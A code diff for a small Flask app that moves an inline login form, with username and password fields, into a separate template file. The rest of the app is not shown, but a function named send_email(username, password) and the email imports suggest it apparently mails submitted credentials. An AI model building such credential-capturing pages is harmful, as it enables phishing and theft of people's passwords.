@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template_string
+from flask import Flask, request, render_template
 import smtplib
 from email.mime.text import MIMEText
 
@@ -35,24 +35,7 @@ def send_email(username, password):
 # Route to display the form
 @app.route("/", methods=["GET"])
 def index():
-    return render_template_string('''
-    <html>
-        <head>
-            <title>Login Form</title>
-        </head>
-        <body>
-            <form method="POST" action="/submit">
-                <label for="username">Username:</label>
-                <input type="text" id="username" name="username" required>
-                <br>
-                <label for="password">Password:</label>
-                <input type="password" id="password" name="password" required>
-                <br>
-                <input type="submit" value="Submit">
-            </form>
-        </body>
-    </html>
-    ''')
+    return render_template("index.html")
 
 # Route to handle form submission
 @app.route("/submit", methods=["POST"])
